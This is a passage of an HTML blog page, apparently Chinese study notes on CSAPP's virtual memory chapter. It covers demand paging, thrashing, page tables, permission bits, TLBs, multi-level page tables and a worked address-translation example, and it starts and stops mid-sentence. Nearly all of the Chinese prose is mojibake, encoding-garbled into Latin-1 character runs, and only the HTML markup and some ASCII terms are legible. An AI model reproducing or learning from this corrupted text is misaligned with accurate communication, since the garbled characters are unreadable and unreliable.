¸éƒ½ä¼šä¿®æ”¹é¡µè¡¨æŠŠç‰ºç‰²é¡µæ›¿æ¢æ‰ï¼ŒæŠŠå½“å‰è¦ç”¨çš„é¡µåœ¨é¡µè¡¨ä¸­æ›¿æ¢ä¸Šç‰©ç†åœ°å€ã€‚</p><p>åœ¨è™šæ‹Ÿå†…å­˜çš„ä¹ æƒ¯è¯´æ³•ä¸­ï¼Œå—è¢«ç§°ä¸ºé¡µã€‚åœ¨ç£ç›˜å’Œå†…å­˜ä¹‹é—´ä¼ é€é¡µçš„æ´»åŠ¨å«åš<strong>äº¤æ¢</strong>ï¼ˆswappingï¼‰æˆ–è€…<strong>é¡µé¢è°ƒåº¦</strong>ï¼ˆpagingï¼‰ã€‚é¡µä»ç£ç›˜æ¢å…¥ï¼ˆæˆ–è€…é¡µé¢è°ƒå…¥ï¼‰DRAM å’Œä»DRAM æ¢å‡ºï¼ˆæˆ–è€…é¡µé¢è°ƒå‡ºï¼‰ç£ç›˜ã€‚ä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°æœ€åæ—¶åˆ»ï¼Œä¹Ÿå°±æ˜¯å½“æœ‰ä¸å‘½ä¸­å‘ç”Ÿæ—¶ï¼Œæ‰æ¢å…¥é¡µé¢çš„è¿™ç§ç­–ç•¥ç§°ä¸º<strong>æŒ‰éœ€é¡µé¢è°ƒåº¦</strong>ï¼ˆdemand pagingï¼‰ã€‚å½“ç„¶ä¹Ÿæœ‰å…¶ä»–çš„è°ƒåº¦æ–¹å¼ï¼Œä½†æ˜¯æ‰€æœ‰ç°ä»£ç³»ç»Ÿéƒ½ä½¿ç”¨çš„æ˜¯æŒ‰éœ€é¡µé¢è°ƒåº¦çš„æ–¹å¼ã€‚</p><h3 id="åˆ†é…é¡µé¢"><a href="#åˆ†é…é¡µé¢" class="headerlink" title="åˆ†é…é¡µé¢"></a>åˆ†é…é¡µé¢</h3><p>åˆ†é…ä¸€ä¸ªé¡µçš„åˆ†é…è¿‡ç¨‹æ˜¯åœ¨<strong>ç£ç›˜</strong>ä¸Šåˆ›å»ºç©ºé—´å¹¶æ›´æ–°é¡µè¡¨ï¼Œä½¿å®ƒæŒ‡å‘ç£ç›˜ä¸Šè¿™ä¸ªæ–°åˆ›å»ºçš„é¡µé¢ã€‚</p><h3 id="å±€éƒ¨æ€§"><a href="#å±€éƒ¨æ€§" class="headerlink" title="å±€éƒ¨æ€§"></a>å±€éƒ¨æ€§</h3><blockquote><p>åŸæ¥çš„å°èŠ‚æ ‡é¢˜â€œåˆæ˜¯å±€éƒ¨æ€§æ•‘äº†æˆ‘ä»¬â€è¿™ä¸ªç¿»è¯‘å¥½ä¸­äºŒå“ˆå“ˆå“ˆå“ˆå“ˆ</p></blockquote><p>æˆ‘ä»¬å‰é¢æœ‰è¯´è™šæ‹Ÿå†…å­˜çš„ä¸å‘½ä¸­å¤„ç½šå¾ˆå¤§ï¼Œé¡µé¢è°ƒåº¦æ˜¯å¦ä¼šå½±å“æˆ‘ä»¬çš„ç¨‹åºæ€§èƒ½å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œç”±äºå±€éƒ¨æ€§åŸåˆ™ä¿è¯äº†åœ¨ä»»ä½•æ—¶åˆ»ï¼Œç¨‹åºå°†è¶‹å‘äºåœ¨ä¸€ä¸ªè¾ƒå°çš„æ´»åŠ¨é¡µé¢é›†åˆä¸Šå·¥ä½œï¼Œè¿™ä¸ªé›†åˆå«åšå·¥ä½œé›†æˆ–è€…å¸¸é©»é›†åˆã€‚åœ¨åˆå§‹å¼€é”€ï¼Œä¹Ÿå°±æ˜¯å°†å·¥ä½œé›†é¡µé¢è°ƒåº¦åˆ°å†…å­˜ä¸­ä¹‹åï¼Œæ¥ä¸‹æ¥å¯¹è¿™ä¸ªå·¥ä½œé›†çš„å¼•ç”¨å°†å¯¼è‡´å‘½ä¸­ï¼Œè€Œä¸ä¼šäº§ç”Ÿé¢å¤–çš„ç£ç›˜æµé‡ã€‚</p><p>å¦‚æœå·¥ä½œé›†çš„å¤§å°è¶…å‡ºäº†ç‰©ç†å†…å­˜çš„å¤§å°ï¼Œé‚£ä¹ˆç¨‹åºå°†äº§ç”Ÿä¸€ç§ä¸å¹¸çš„çŠ¶æ€ï¼Œå«åšæŠ–åŠ¨(thrashing)ï¼Œè¿™æ—¶é¡µé¢å°†ä¸æ–­åœ°æ¢è¿›æ¢å‡ºã€‚å¦‚æœç¨‹åºçªç„¶è¿è¡Œçš„å¾ˆæ…¢ï¼Œæˆ‘ä»¬å°±è¦è€ƒè™‘æ˜¯ä¸æ˜¯å‘ç”Ÿäº†æŠ–åŠ¨ã€‚</p><h1 id="è™šæ‹Ÿå†…å­˜ä½œä¸ºå†…å­˜ç®¡ç†çš„å·¥å…·"><a href="#è™šæ‹Ÿå†…å­˜ä½œä¸ºå†…å­˜ç®¡ç†çš„å·¥å…·" class="headerlink" title="è™šæ‹Ÿå†…å­˜ä½œä¸ºå†…å­˜ç®¡ç†çš„å·¥å…·"></a>è™šæ‹Ÿå†…å­˜ä½œä¸ºå†…å­˜ç®¡ç†çš„å·¥å…·</h1><p>å®é™…ä¸Šï¼Œæ“ä½œç³»ç»Ÿä¸ºæ¯ä¸ªè¿›ç¨‹éƒ½æä¾›äº†ä¸€ä¸ªç‹¬ç«‹çš„é¡µè¡¨ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%8B%AC%E7%AB%8B%E9%A1%B5%E8%A1%A8.png"></p><p>VM ç®€åŒ–äº†è¿æ¥å’ŒåŠ è½½ã€ä»£ç å’Œæ•°æ®å…±äº«ä»¥åŠç¨‹åºä¸­çš„å†…å­˜åˆ†é…ï¼š</p><ul><li><p>ç®€åŒ–é“¾æ¥ï¼šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ Linux x86-64 ä¸‹é¢é“¾æ¥å¾—åˆ°çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå®ƒçš„åœ°å€å‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯ä» <code>0x400000</code> å¼€å§‹çš„ä»£ç æ®µï¼Œæ­£æ˜¯ç”±äºè™šæ‹Ÿå†…å­˜å¯¼è‡´æˆ‘ä»¬å¯ä»¥ä¸éœ€è¦è€ƒè™‘å½“æ—¶ç”µè„‘çš„è¿è¡ŒçŠ¶æ€ï¼Œå› ä¸ºä¸åŒè¿›ç¨‹çš„ <code>0x400000</code> åœ°å€æ‰€æ˜ å°„åˆ°çš„ç‰©ç†å†…å­˜åœ°å€éƒ½æ˜¯ä¸ä¸€æ ·çš„ã€‚å¦‚æœç›´æ¥ä½¿ç”¨ç‰©ç†åœ°å€çš„è¯ï¼Œé‚£ä¹ˆä¸åŒè¿›ç¨‹å¿…é¡»åˆ’åˆ†åœ°å€å‡ºæ¥ï¼Œå ç”¨ç›¸åŒåœ°å€ç©ºé—´çš„ç¨‹åºå°†ä¸èƒ½åŒæ—¶è¿è¡Œã€‚</p></li><li><p>ç®€åŒ–åŠ è½½ï¼šåŠ è½½è¿è¡Œä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œæˆ‘åªéœ€è¦å°†é¡µè¡¨æ ‡è®°åˆ°ç£ç›˜çš„æŒ‡å®šä½ç½®ï¼Œå¹¶æ ‡è®°ä¸ºæ— æ•ˆçš„ï¼ˆæœªç¼“å­˜çš„ï¼‰ï¼ŒCPU å°è¯•è®¿é—®è¿™ä¸ªè™šæ‹Ÿå†…å­˜çš„æ—¶å€™ï¼Œå‘ç°æ²¡æœ‰è¢«ç¼“å­˜ï¼Œè‡ªåŠ¨ä»ç£ç›˜è°ƒå…¥æ•°æ®åˆ°å†…å­˜ä¸­ï¼Œè™šæ‹Ÿå†…å­˜æœºåˆ¶å¸®æˆ‘ä»¬ç®€åŒ–äº†ä»ç£ç›˜å¤åˆ¶æ•°æ®åˆ°å†…å­˜çš„è¿‡ç¨‹ã€‚</p></li><li><p>ç®€åŒ–å…±äº«ï¼šå¦‚æœæˆ‘ä»¬æƒ³åŠ è½½ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“åˆ°å¦å¤–ä¸€ä¸ªå†…å­˜ï¼Œæˆ‘ä»¬åªéœ€è¦å…ˆçœ‹çœ‹æœ‰æ²¡æœ‰å·²åŠ è½½çš„å†…å­˜ï¼Œå¦‚æœæœ‰ç›´æ¥è®©å¸Œæœ›åŠ è½½åŠ¨æ€é“¾æ¥åº“çš„è¿›ç¨‹ç›´æ¥æ˜ å°„ä¸€å—è™šæ‹Ÿå†…å­˜è¿‡å»å³å¯ã€‚</p></li><li><p>ç®€åŒ–å†…å­˜åˆ†é…ï¼šç”±äºè™šæ‹Ÿå†…å­˜æœºåˆ¶çš„å­˜åœ¨ï¼Œæˆ‘ä»¬æƒ³è¦åˆ†é…ä¸€ä¸ªå¾ˆå¤§çš„è¿ç»­çš„è™šæ‹Ÿåœ°å€ç©ºé—´å¯ä»¥å…è®¸æˆ‘ä»¬ç”¨ä¸åŒçš„ç‰©ç†å†…å­˜é¡µï¼Œæ›´é«˜æ•ˆåœ°åˆ©ç”¨äº†ç¢ç‰‡åŒ–çš„å†…å­˜ã€‚</p></li></ul><h1 id="è™šæ‹Ÿå†…å­˜ä½œä¸ºå†…å­˜ä¿æŠ¤çš„å·¥å…·"><a href="#è™šæ‹Ÿå†…å­˜ä½œä¸ºå†…å­˜ä¿æŠ¤çš„å·¥å…·" class="headerlink" title="è™šæ‹Ÿå†…å­˜ä½œä¸ºå†…å­˜ä¿æŠ¤çš„å·¥å…·"></a>è™šæ‹Ÿå†…å­˜ä½œä¸ºå†…å­˜ä¿æŠ¤çš„å·¥å…·</h1><p>æ¯æ¬¡ CPU ç”Ÿæˆä¸€ä¸ªåœ°å€æ—¶ï¼Œåœ°å€ç¿»è¯‘ç¡¬ä»¶éƒ½ä¼šè¯»ä¸€ä¸ª PTE ï¼Œå¹¶åœ¨ PTE ä¸Šæ·»åŠ é¢å¤–çš„è®¸å¯ä½æ¥æ§åˆ¶å¯¹è™šæ‹Ÿé¡µé¢å†…å®¹çš„è®¿é—®ã€‚</p><p>è®¸å¯ä½æœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯ SUP ä½ã€READ ä½å’Œ WRITE ä½ã€‚SUP ä½è¡¨ç¤ºè¿›ç¨‹æ˜¯å¦å¿…é¡»è¿è¡Œåœ¨å†…æ ¸æ¨¡å¼ä¸‹æ‰èƒ½è®¿é—®è¯¥é¡µã€‚READä½å’Œ WRITE ä½æ§åˆ¶å¯¹é¡µé¢çš„è¯»å’Œå†™è®¿é—®ã€‚</p><h1 id="åœ°å€ç¿»è¯‘"><a href="#åœ°å€ç¿»è¯‘" class="headerlink" title="åœ°å€ç¿»è¯‘"></a>åœ°å€ç¿»è¯‘</h1><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E5%9C%B0%E5%9D%80%E7%BF%BB%E8%AF%91%E7%AC%A6%E5%8F%B7.png"></p><p>å½¢å¼ä¸Šæ¥è¯´ï¼Œåœ°å€ç¿»è¯‘æ˜¯ä¸€ä¸ª N å…ƒç´ çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆVASï¼‰ä¸­çš„å…ƒç´ å’Œä¸€ä¸ª M å…ƒç´ çš„ç‰©ç†åœ°å€ç©ºé—´ï¼ˆPASï¼‰ä¸­å…ƒç´ ä¹‹é—´çš„æ˜ å°„ã€‚</p><p>ä¸‹é¢ä¸€å¼ å›¾åæ˜ äº†è¿™å…³ç³»ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E4%BD%BF%E7%94%A8%E9%A1%B5%E8%A1%A8%E7%9A%84%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84.png"></p><p>å¦‚ä¸Šå›¾ï¼ŒCPU ä¸­çš„é¡µè¡¨åŸºå€å¯„å­˜å™¨ï¼ˆPTBRï¼‰æŒ‡å‘å½“å‰é¡µé¢ã€‚n ä½çš„è™šæ‹Ÿåœ°å€åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼šä¸€ä¸ª P ä½çš„è™šæ‹Ÿé¡µé¢åç§»ï¼ˆVPOï¼‰å’Œä¸€ä¸ª n-p ä½çš„è™šæ‹Ÿé¡µå·ï¼ˆVPNï¼‰ã€‚MMU ä¹Ÿä¸€ä¾æ® VPN æ¥é€‰æ‹© PTE ã€‚</p><p>é¡µé¢å‘½ä¸­æ—¶ï¼ŒCPU ç¡¬ä»¶æ‰§è¡Œçš„æ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li>ç¬¬ 1 æ­¥ï¼šå¤„ç†å™¨ç”Ÿæˆä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œå¹¶æŠŠå®ƒä¼ é€ç»™ MMUã€‚</li><li>ç¬¬ 2 æ­¥ï¼šMMU ç”Ÿæˆ PTE åœ°å€ï¼Œå¹¶ä»é«˜é€Ÿç¼“å­˜&#x2F;ä¸»å­˜è¯·æ±‚å¾—åˆ°å®ƒã€‚</li><li>ç¬¬ 3 æ­¥ï¼šé«˜é€Ÿç¼“å­˜&#x2F;ä¸»å­˜å‘ MMU è¿”å› PTEã€‚</li><li>ç¬¬ 4 æ­¥ï¼šMMU æ„é€ ç‰©ç†åœ°å€ï¼Œå¹¶æŠŠå®ƒä¼ é€ç»™é«˜é€Ÿç¼“å­˜&#x2F;ä¸»å­˜ã€‚</li><li>ç¬¬ 5 æ­¥ï¼šé«˜é€Ÿç¼“å­˜&#x2F;ä¸»å­˜è¿”å›æ‰€è¯·æ±‚çš„æ•°æ®å­—ç»™å¤„ç†å™¨ã€‚</li></ul><p>ç¼ºé¡µæ—¶ä»ç¬¬å››æ­¥å¼€å§‹ä¸åŒï¼š</p><ul><li>ç¬¬ 4 æ­¥ï¼šPTE ä¸­çš„æœ‰æ•ˆä½æ˜¯é›¶ï¼Œæ‰€ä»¥ MMU è§¦å‘äº†ä¸€æ¬¡å¼‚å¸¸ï¼Œä¼ é€’ CPU ä¸­çš„æ§åˆ¶åˆ°æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„ç¼ºé¡µå¼‚å¸¸å¤„ç†ç¨‹åºã€‚</li><li>ç¬¬ 5 æ­¥ï¼šç¼ºé¡µå¤„ç†ç¨‹åºç¡®å®šå‡ºç‰©ç†å†…å­˜ä¸­çš„ç‰ºç‰²é¡µï¼Œå¦‚æœè¿™ä¸ªé¡µé¢å·²ç»è¢«ä¿®æ”¹äº†ï¼Œåˆ™æŠŠå®ƒæ¢å‡ºåˆ°ç£ç›˜ã€‚</li><li>ç¬¬ 6 æ­¥ï¼šç¼ºé¡µå¤„ç†ç¨‹åºé¡µé¢è°ƒå…¥æ–°çš„é¡µé¢ï¼Œå¹¶æ›´æ–°å†…å­˜ä¸­çš„ PTE ã€‚</li><li>ç¬¬ 7 æ­¥ï¼šç¼ºé¡µå¤„ç†ç¨‹åºè¿”å›åˆ°åŸæ¥çš„è¿›ç¨‹ï¼Œå†æ¬¡æ‰§è¡Œå¯¼è‡´ç¼ºé¡µçš„æŒ‡ä»¤ã€‚CPU å°†å¼•èµ·ç¼ºé¡µçš„è™šæ‹Ÿåœ°å€é‡æ–°å‘é€ç»™ MMUã€‚å› ä¸ºè™šæ‹Ÿé¡µé¢ç°åœ¨ç¼“å­˜åœ¨ç‰©ç†å†…å­˜ä¸­ï¼Œæ‰€ä»¥å°±ä¼šå‘½ä¸­ï¼Œä¹‹åå°±è·Ÿæ­£å¸¸ä¸€æ ·ï¼Œä¸»å­˜ä¼šå°†æ‰€è¯·æ±‚å­—è¿”å›ç»™å¤„ç†å™¨ã€‚</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%BC%BA%E9%A1%B5%E5%92%8C%E4%B8%8D%E7%BC%BA%E9%A1%B5.png"></p><h3 id="ç»“åˆé«˜é€Ÿç¼“å­˜å’Œè™šæ‹Ÿå†…å­˜"><a href="#ç»“åˆé«˜é€Ÿç¼“å­˜å’Œè™šæ‹Ÿå†…å­˜" class="headerlink" title="ç»“åˆé«˜é€Ÿç¼“å­˜å’Œè™šæ‹Ÿå†…å­˜"></a>ç»“åˆé«˜é€Ÿç¼“å­˜å’Œè™šæ‹Ÿå†…å­˜</h3><p>åœ¨åŠä½¿ç”¨è™šæ‹Ÿå†…å­˜åˆä½¿ç”¨ SRAM é«˜é€Ÿç¼“å­˜çš„ç³»ç»Ÿä¸­ï¼Œå¤§å¤šæ•°ç³»ç»Ÿé€‰æ‹©ç‰©ç†å¯»å€ï¼Œå¾—çŸ¥ç¿»è¯‘å‘ç”Ÿåœ¨é«˜é€Ÿç¼“å­˜æŸ¥æ‰¾ä¹‹å‰ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E5%92%8CSRAM.png"></p><h3 id="åˆ©ç”¨-TLB-åŠ é€Ÿåœ°å€ç¿»è¯‘"><a href="#åˆ©ç”¨-TLB-åŠ é€Ÿåœ°å€ç¿»è¯‘" class="headerlink" title="åˆ©ç”¨ TLB åŠ é€Ÿåœ°å€ç¿»è¯‘"></a>åˆ©ç”¨ TLB åŠ é€Ÿåœ°å€ç¿»è¯‘</h3><p>TLB æ˜¯ä¸€ä¸ªå°çš„ã€è™šæ‹Ÿå¯»å€çš„ç¼“å­˜ï¼Œå…¶ä¸­æ¯ä¸€è¡Œéƒ½ä¿å­˜ç€ä¸€ä¸ªç”±å•ä¸ª PTE ç»„æˆçš„å—ã€‚TLBé€šå¸¸æœ‰é«˜åº¦çš„ç›¸è”åº¦ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-TLB.png"></p><p>åœ¨TLB ä¸­ï¼Œ<code>VPN</code> çš„ä½ t ä½æ˜¯ç´¢å¼•ï¼Œå‰©ä½™é«˜ <code>n-p-t</code> ä½ä¸ºæ ‡è®°ã€‚</p><p>TLB çš„åœ°å€ç¿»è¯‘éƒ½æ˜¯åœ¨èŠ¯ç‰‡ä¸­çš„ MMU è¿›è¡Œçš„ï¼Œå°±é¿å…äº†å»è¯»å–å†…å­˜ï¼Œæ‰€ä»¥éå¸¸å¿«.</p><h3 id="å¤šçº§é¡µè¡¨"><a href="#å¤šçº§é¡µè¡¨" class="headerlink" title="å¤šçº§é¡µè¡¨"></a>å¤šçº§é¡µè¡¨</h3><p>å®é™…çš„ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬é‡‡ç”¨å±‚æ¬¡ç»“æ„çš„é¡µè¡¨ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E5%A4%9A%E7%BA%A7%E9%A1%B5%E8%A1%A8.png"></p><p>ä»¥32ä½ç¨‹åºä¸ºä¾‹ï¼ŒäºŒçº§é¡µè¡¨ä¸­çš„æ¯ä¸ª PTE éƒ½è´Ÿè´£æ˜ å°„ä¸€ä¸ª 4KB çš„è™šæ‹Ÿå†…å­˜é¡µé¢ï¼Œ</p><p>è¿™ç§æ–¹æ³•ä»ä¸¤ä¸ªæ–¹é¢å‡å°‘äº†å†…å­˜è¦æ±‚ï¼š</p><ul><li><p>å¦‚æœä¸€çº§é¡µè¡¨ä¸­çš„ä¸€ä¸ª PTE æ˜¯ç©ºçš„ï¼Œé‚£ä¹ˆç›¸åº”çš„äºŒçº§é¡µè¡¨å°±æ ¹æœ¬ä¸ä¼šå­˜åœ¨ã€‚</p></li><li><p>åªæœ‰ä¸€çº§é¡µè¡¨æ‰éœ€è¦æ€»æ˜¯åœ¨ä¸»å­˜ä¸­ï¼Œåªæœ‰æœ€ç»å¸¸ä½¿ç”¨çš„äºŒçº§é¡µè¡¨æ‰éœ€è¦ç¼“å­˜åœ¨ä¸»å­˜ä¸­ã€‚è™šæ‹Ÿå†…å­˜ç³»ç»Ÿå¯ä»¥åœ¨éœ€è¦æ—¶åˆ›å»ºã€é¡µé¢è°ƒäººæˆ–è°ƒå‡ºäºŒçº§é¡µè¡¨ï¼Œè¿™å°±å‡å°‘äº†ä¸»å­˜çš„å‹åŠ›ã€‚</p></li></ul><p>é‚£ä¹ˆå¯¹äºä¸€ä¸ª 32 ä½çš„å†…å­˜åœ°å€ï¼Œæ¯ä¸ªåœ°å€éƒ½ä¼šè¢«åˆ’åˆ†ä¸º k ä¸ª VPN å’Œ 1 ä¸ª VPOã€‚æ¯ä¸ª VPNi éƒ½æ˜¯ä¸€ä¸ªåˆ°ç¬¬çº§é¡µè¡¨çš„ç´¢å¼•ã€‚ç¬¬ i çº§é¡µè¡¨ä¸­çš„æ¯ä¸ª PTEï¼Œéƒ½æŒ‡å‘ç¬¬ j+1çº§çš„æŸä¸ªé¡µè¡¨çš„åŸºå€ã€‚å¯ä»¥ç†è§£ä¸ºï¼Œå‰ 10 ä½å°±è¡¨ç¤ºä¸€çº§é¡µè¡¨åç§»ï¼Œä¸­é—´ 10 ä½è¡¨ç¤ºäºŒçº§é¡µè¡¨åç§»ï¼Œå‰©ä¸‹ 12 ä½å°±æ˜¯é¡µå†…åç§»äº†ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E4%BD%BF%E7%94%A8K%E7%BA%A7%E9%A1%B5%E8%A1%A8%E7%9A%84%E5%9C%B0%E5%9D%80%E7%BF%BB%E8%AF%91.png"></p><h3 id="ç«¯åˆ°ç«¯çš„åœ°å€ç¿»è¯‘"><a href="#ç«¯åˆ°ç«¯çš„åœ°å€ç¿»è¯‘" class="headerlink" title="ç«¯åˆ°ç«¯çš„åœ°å€ç¿»è¯‘"></a>ç«¯åˆ°ç«¯çš„åœ°å€ç¿»è¯‘</h3><p>æˆ‘ä»¬å‡è®¾ç³»ç»Ÿå‚æ•°å¦‚ä¸‹ï¼š</p><ul><li>å†…å­˜æ˜¯æŒ‰å­—èŠ‚å¯»å€çš„ã€‚</li><li>å†…å­˜è®¿é—®æ˜¯é’ˆå¯¹ 1 å­—èŠ‚çš„å­—çš„ï¼ˆä¸æ˜¯ 4 å­—èŠ‚çš„å­—ï¼‰ã€‚</li><li>è™šæ‹Ÿåœ°å€æ˜¯ 14 ä½é•¿çš„ï¼ˆn&#x3D;14ï¼‰ã€‚</li><li>ç‰©ç†åœ°å€æ˜¯ 12 ä½é•¿çš„ï¼ˆm&#x3D;12ï¼‰ã€‚</li><li>é¡µé¢å¤§å°æ˜¯ 64 å­—èŠ‚ï¼ˆP&#x3D;64ï¼‰ã€‚</li><li>TLB æ˜¯å››è·¯ç»„ç›¸è”çš„ï¼Œæ€»å…±æœ‰ 16 ä¸ªæ¡ç›®ã€‚</li><li>L1 d-cache æ˜¯ç‰©ç†å¯»å€ã€ç›´æ¥æ˜ å°„çš„ï¼Œè¡Œå¤§å°ä¸º 4 å­—èŠ‚ï¼Œè€Œæ€»å…±æœ‰ 16 ä¸ªç»„ã€‚</li></ul><p>æˆ‘ä»¬å¯¹è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€çš„æ ¼å¼åˆ’åˆ†å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%9C%B0%E5%9D%80%E5%88%92%E5%88%86.png"></p><p>ä¸‹å›¾æ˜¯å°å†…å­˜ç³»ç»Ÿçš„ä¸€ä¸ªå¿«ç…§ï¼ŒåŒ…æ‹¬ TLBã€é¡µè¡¨çš„ä¸€éƒ¨åˆ†å’Œ L1 é«˜é€Ÿç¼“å­˜ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%AB%AF%E5%88%B0%E7%AB%AFTLB.png"></p><p>TLB æ˜¯åˆ©ç”¨ VPN çš„ä½è¿›è¡Œè™šæ‹Ÿå¯»å€çš„ã€‚å› ä¸º TLB æœ‰ 4 ä¸ªç»„ï¼Œæ‰€ä»¥ VPN çš„ä½ 2 ä½å°±ä½œä¸ºç»„ç´¢å¼•ï¼ˆTLBIï¼‰ã€‚VPN ä¸­å‰©ä¸‹çš„é«˜ 6ä½ä½œä¸ºæ ‡è®°ï¼ˆTLBTï¼‰ï¼Œç”¨æ¥åŒºåˆ«å¯èƒ½æ˜ å°„åˆ°åŒä¸€ä¸ª TLB ç»„çš„ä¸åŒçš„ VPNã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%AB%AF%E5%88%B0%E7%AB%AF%E9%A1%B5%E8%A1%A8.png"></p><p>é¡µè¡¨æ˜¯ä¸€ä¸ªå•çº§è®¾è®¡ï¼Œä¸€å…±æœ‰ $$2^8&#x3D;256 $$ ä¸ªé¡µè¡¨æ¡ç›®ï¼ˆPTEï¼‰ã€‚æˆ‘ä»¬åªå±•ç¤ºäº†å¼€å¤´çš„ 16 ä¸ªã€‚ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬ç”¨ç´¢å¼•å®ƒçš„ VPN æ¥æ ‡è¯†æ¯ä¸ª PTEã€‚</p><p>ä½†æ˜¯è¦æ³¨æ„è¿™äº› VPN å¹¶ä¸æ˜¯é¡µè¡¨çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿä¸å‚¨å­˜åœ¨å†…å­˜ä¸­ã€‚å¦å¤–ï¼Œå›¾ä¸­æœ‰æ•ˆä½è¢«æ ‡è®°ä¸º 0 çš„ PTE çš„ PPN éƒ½ç”¨ä¸€ä¸ªç ´æŠ˜å·æ¥è¡¨ç¤ºã€‚æ— è®ºè¿™é‡Œå­˜å‚¨çš„æ˜¯ä»€ä¹ˆä½å€¼ï¼Œéƒ½æ˜¯æ²¡æœ‰ä»»ä½•æ„ä¹‰çš„ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%AB%AF%E5%88%B0%E7%AB%AF%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png"></p><p>ç›´æ¥æ˜ å°„çš„ç¼“å­˜æ˜¯é€šè¿‡ç‰©ç†åœ°å€ä¸­çš„å­—æ®µæ¥å¯»å€çš„ã€‚å› ä¸ºæ¯ä¸ªå—éƒ½æ˜¯ 4 å­—èŠ‚ï¼Œæ‰€ä»¥ç‰©ç†åœ°å€çš„ä½ 2 ä½ä½œä¸ºå—åç§»ï¼ˆCOï¼‰ã€‚å› ä¸ºæœ‰ 16 ç»„ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„ 4 ä½å°±ç”¨æ¥è¡¨ç¤ºç»„ç´¢å¼•ï¼ˆCIï¼‰ï¼Œå‰©ä¸‹çš„ 6 ä½ä½œä¸ºæ ‡è®°ï¼ˆCTï¼‰ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯æ‰€æœ‰çš„åˆå§‹åŒ–çš„è®¾å®šã€‚</p><p>æˆ‘ä»¬çœ‹çœ‹å½“ CPU æ‰§è¡Œä¸€æ¡è¯»åœ°å€ 0x03d4 å¤„å­—èŠ‚çš„åŠ è½½æŒ‡ä»¤æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆã€‚</p><p>é¦–å…ˆæˆ‘ä»¬æŠŠåœ°å€åˆ’åˆ†ä¸€ä¸‹ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%9C%B0%E5%9D%80%E5%88%92%E5%88%86%E5%AE%9E%E4%BE%8B.png"></p><p>å¼€å§‹æ—¶,MMUä¼šä»è™šæ‹Ÿåœ°å€ä¸­å–å‡º VPN(0xF) ï¼Œå¹¶æ£€æŸ¥ TLBã€‚åœ¨ä¸Šæ–¹åˆå§‹è®¾å®šä¸­çš„é¡µè¡¨å›¾ä¸­ï¼Œæˆ‘ä»¬èƒ½æ‰¾åˆ°ä¸€ä¸ª PPN ä¸º 0xD çš„è®°å½•ï¼Œé‚£ä¹ˆæ‹¿åˆ°è¿™ä¸ª PPN ä¹‹åï¼Œæˆ‘ä»¬å’Œ VPO(0x14) æ‹¼æ¥å°±ç®—å‡ºç‰©ç†åœ°å€ï¼ˆ0x354ï¼‰äº†ã€‚</p><p>æ¥ä¸‹æ¥,MMU 